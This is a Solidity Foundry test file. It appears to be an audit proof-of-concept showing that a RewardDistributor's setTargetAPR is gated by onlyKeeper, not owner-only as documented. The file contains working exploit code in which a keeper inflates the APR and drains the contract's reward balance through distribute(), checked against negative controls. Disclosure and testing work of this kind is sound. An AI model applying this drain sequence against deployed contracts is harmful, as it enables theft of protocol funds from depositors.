// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {ERC20} from "@solmate/tokens/ERC20.sol";
import {RewardDistributor} from "src/periphery/RewardDistributor.sol";

/*//////////////////////////////////////////////////////////////////////////
                              MINIMAL TEST TOKEN
//////////////////////////////////////////////////////////////////////////*/

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MOCK", 18) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/*//////////////////////////////////////////////////////////////////////////
                    MINIMAL INFRARED / VAULT MOCKS

  These mocks implement only the subset of the interface that
  `RewardDistributor` actually calls. They are intentionally tiny:
  the goal is to isolate the auth-bypass + drain, not re-stage the
  whole protocol.
//////////////////////////////////////////////////////////////////////////*/

contract MockVault {
    address public immutable rewardsToken;
    uint256 public totalSupply;

    // Mirrors the 7-tuple return of InfraredVault.rewardData
    uint256 public rewardsDuration;
    uint256 public periodFinish;
    uint256 public rewardRate;
    uint256 public lastUpdateTime;
    uint256 public rewardPerTokenStored;
    uint256 public rewardResidual;

    constructor(address _rewardsToken, uint256 _totalSupply) {
        rewardsToken = _rewardsToken;
        totalSupply = _totalSupply;
        rewardsDuration = 7 days;
    }

    function rewardData(address)
        external
        view
        returns (
            address rewardsDistributor,
            uint256 _rewardsDuration,
            uint256 _periodFinish,
            uint256 _rewardRate,
            uint256 _lastUpdateTime,
            uint256 _rewardPerTokenStored,
            uint256 _rewardResidual
        )
    {
        return (
            address(0),
            rewardsDuration,
            periodFinish,
            rewardRate,
            lastUpdateTime,
            rewardPerTokenStored,
            rewardResidual
        );
    }

    // Called by Infrared.addIncentives → vault.notifyRewardAmount in prod;
    // here we shortcut and simulate accepting incoming rewards.
    function notifyRewardAmount(uint256 reward) external {
        if (block.timestamp >= periodFinish) {
            rewardRate = reward / rewardsDuration;
        } else {
            uint256 remaining = periodFinish - block.timestamp;
            uint256 leftover = remaining * rewardRate;
            rewardRate = (reward + leftover) / rewardsDuration;
        }
        lastUpdateTime = block.timestamp;
        periodFinish = block.timestamp + rewardsDuration;
    }
}

contract MockInfrared {
    mapping(address => address) public vaults;
    uint256 public lastAmount;

    function setVault(address stakingToken, address vault) external {
        vaults[stakingToken] = vault;
    }

    function vaultRegistry(address stakingToken)
        external
        view
        returns (address)
    {
        return vaults[stakingToken];
    }

    // Mirrors the part of Infrared.addIncentives the distributor exercises:
    // pull tokens from caller, then forward into the vault.
    function addIncentives(
        address _stakingToken,
        address _rewardsToken,
        uint256 _amount
    ) external {
        address vault = vaults[_stakingToken];
        require(vault != address(0), "no vault");
        ERC20(_rewardsToken).transferFrom(msg.sender, vault, _amount);
        MockVault(vault).notifyRewardAmount(_amount);
        lastAmount = _amount;
    }
}

/*//////////////////////////////////////////////////////////////////////////
                             THE PROOF-OF-CONCEPT
//////////////////////////////////////////////////////////////////////////*/

/// @notice PoC
/// @dev    Demonstrates that `RewardDistributor.setTargetAPR` is gated by
///         `onlyKeeper` instead of `onlyOwner` (contrary to the contract's
///         own NatSpec at lines 79-82), letting any keeper rewrite the APR
///         and drain the contract's reward-token balance through
///         `distribute()` in a single keeper-only flow.
contract PoC_RewardDistributor_KeeperEscalation is Test {
    /*//////////////////////////////////////////////////////////////
                              ACTORS
    //////////////////////////////////////////////////////////////*/
    address internal owner = makeAddr("owner");         // documented admin
    address internal keeper = makeAddr("keeper");        // routine operator
    address internal attackerStaker = makeAddr("staker"); // colluding LP

    /*//////////////////////////////////////////////////////////////
                              CONTRACTS
    //////////////////////////////////////////////////////////////*/
    MockToken internal rewardsToken;
    MockToken internal stakingToken;
    MockInfrared internal infraredMock;
    MockVault internal vault;
    RewardDistributor internal distributor;

    /*//////////////////////////////////////////////////////////////
                              CONSTANTS
    //////////////////////////////////////////////////////////////*/
    uint256 internal constant INITIAL_TARGET_APR = 1500;       // 15%
    uint256 internal constant DISTRIBUTION_INTERVAL = 2 hours;
    uint256 internal constant BASIS_POINTS = 10_000;
    // Mirrors `RewardDistributor.SECONDS_PER_YEAR` (365.25 days)
    uint256 internal constant SECONDS_PER_YEAR =
        (36525 * 24 * 60 * 60) / 100;
    uint256 internal constant VAULT_TOTAL_SUPPLY = 10_000 ether;
    uint256 internal constant DISTRIBUTOR_FUNDING = 1_000_000 ether;

    /*//////////////////////////////////////////////////////////////
                              SET-UP
    //////////////////////////////////////////////////////////////*/
    function setUp() external {
        // Tokens
        rewardsToken = new MockToken();
        stakingToken = new MockToken();

        // Mock protocol pieces
        infraredMock = new MockInfrared();
        vault = new MockVault(address(rewardsToken), VAULT_TOTAL_SUPPLY);
        infraredMock.setVault(address(stakingToken), address(vault));

        // Real victim contract.
        distributor = new RewardDistributor(
            owner,
            address(infraredMock),
            address(stakingToken),
            address(rewardsToken),
            keeper,
            INITIAL_TARGET_APR,
            DISTRIBUTION_INTERVAL
        );

        // Pre-fund the distributor — this is the pot the keeper will drain.
        rewardsToken.mint(address(distributor), DISTRIBUTOR_FUNDING);

        // Move past the distribution-interval lockout.
        vm.warp(block.timestamp + DISTRIBUTION_INTERVAL + 1);
    }

    /*//////////////////////////////////////////////////////////////
                                  POC
    //////////////////////////////////////////////////////////////*/

    /// @notice Step 1: prove `setTargetAPR` is callable by a non-owner keeper.
    /// @dev    NatSpec at RewardDistributor.sol:79-82 says only the owner may
    ///         call this. The implementation uses `onlyKeeper`. This test
    ///         is the literal access-control bypass.
    function test_PoC_Step1_KeeperCanRewriteTargetAPR() external {
        // Sanity: keeper is NOT the owner.
        assertTrue(distributor.keepers(keeper),  "keeper must be whitelisted");
        assertTrue(distributor.owner() != keeper,"keeper must not be owner");

        uint256 maliciousAPR = 100_000_000; // 1,000,000% — absurd by design

        // The owner-only modifier (`onlyOwner` from solmate's Owned) would
        // have reverted with "UNAUTHORIZED". The actual `onlyKeeper`
        // modifier accepts the call — so it succeeds.
        vm.prank(keeper);
        distributor.setTargetAPR(maliciousAPR);

        assertEq(
            distributor.targetAPR(),
            maliciousAPR,
            "keeper successfully overwrote a parameter doc'd as owner-only"
        );
    }

    /// @notice Step 2: end-to-end drain — keeper raises APR, then distributes.
    /// @dev    With the inflated APR, `distribute()` empties the contract's
    ///         reward-token balance into the vault in a single shot. A
    ///         keeper who is also (or colludes with) a staker harvests the
    ///         inflated stream from the vault.
    function test_PoC_Step2_KeeperDrainsRewardsViaInflatedAPR() external {
        uint256 balBefore = rewardsToken.balanceOf(address(distributor));
        assertEq(balBefore, DISTRIBUTOR_FUNDING, "pre-condition: pot full");

        // -- A) Compute the APR required to demand the whole balance.
        //
        //  totalRewardsNeeded = (targetAPR * totalSupply * rewardsDuration)
        //                     / (SECONDS_PER_YEAR * BASIS_POINTS)
        //
        // Solving for `targetAPR` so that totalRewardsNeeded == balBefore:
        //
        //  targetAPR = balBefore * SECONDS_PER_YEAR * BASIS_POINTS
        //              / (totalSupply * rewardsDuration)
        uint256 totalSupply = vault.totalSupply();
        uint256 rewardsDuration = vault.rewardsDuration();
        uint256 maliciousAPR = (
            balBefore * SECONDS_PER_YEAR * BASIS_POINTS
        ) / (totalSupply * rewardsDuration);

        // -- B) Keeper rewrites APR (the bug).
        vm.prank(keeper);
        distributor.setTargetAPR(maliciousAPR);

        // -- C) Keeper triggers distribute() — uses the inflated APR to
        //       drain the pot into the vault in one transaction.
        uint256 maxSupply = distributor.getMaxTotalSupply();
        vm.prank(keeper);
        distributor.distribute(maxSupply);

        // -- D) Verify: the entire pot moved out of the distributor.
        uint256 balAfter = rewardsToken.balanceOf(address(distributor));
        uint256 vaultBal = rewardsToken.balanceOf(address(vault));

        assertLt(
            balAfter,
            balBefore / 1000,
            "keeper drained ~all rewards from the distributor"
        );
        assertGe(
            vaultBal,
            (balBefore * 999) / 1000,
            "drained rewards landed in the vault, claimable pro-rata by stakers"
        );

        // -- E) Compare against the *intended* per-cycle outflow at the
        //       owner-set 15% APR. The bug lets the keeper push out orders
        //       of magnitude more.
        uint256 intendedOutflow = (
            INITIAL_TARGET_APR * totalSupply * rewardsDuration
        ) / (SECONDS_PER_YEAR * BASIS_POINTS);

        emit log_named_uint(
            "intended outflow @ 15% APR (wei)", intendedOutflow
        );
        emit log_named_uint(
            "actual   outflow after exploit  (wei)", vaultBal
        );

        assertGt(
            vaultBal,
            intendedOutflow * 1000,
            "exploit outflow is >1000x the policy-intended amount"
        );
    }

    /// @notice Negative control: a non-keeper, non-owner outsider cannot
    ///         trigger the same bug — confirming the issue is *specifically*
    ///         the wrong-modifier choice, not a missing modifier.
    function test_PoC_Control_OutsiderCannotRewriteAPR() external {
        address outsider = makeAddr("outsider");
        vm.prank(outsider);
        vm.expectRevert(RewardDistributor.NotKeeper.selector);
        distributor.setTargetAPR(1e9);
    }

    /// @notice Negative control: the owner *can* rewrite the APR too —
    ///         which is what the NatSpec promises. The bug is that the
    ///         keeper *also* can.
    function test_PoC_Control_OwnerCanAlsoRewriteAPR() external {
        // Owner is registered as a keeper in the constructor (keepers[_gov]=true),
        // so the `onlyKeeper` modifier lets them through. This is the only
        // reason the NatSpec ever appeared to hold in casual testing.
        vm.prank(owner);
        distributor.setTargetAPR(2_500);
        assertEq(distributor.targetAPR(), 2_500);
    }
}
